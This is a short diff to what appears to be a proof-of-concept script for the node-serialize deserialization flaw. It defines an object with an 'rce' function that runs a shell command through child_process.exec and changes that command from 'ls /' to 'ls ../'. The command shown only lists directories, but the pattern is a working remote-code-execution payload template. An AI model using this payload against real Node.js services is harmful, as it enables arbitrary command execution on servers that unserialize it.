@@ -17,7 +17,7 @@ var serialize = require('node-serialize');
 
 var y = {
     rce : function(){
-    require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
+    require('child_process').exec('ls ../', function(error, stdout, stderr) { console.log(stdout) });
     }(),
     }
     var serialize = require('node-serialize');
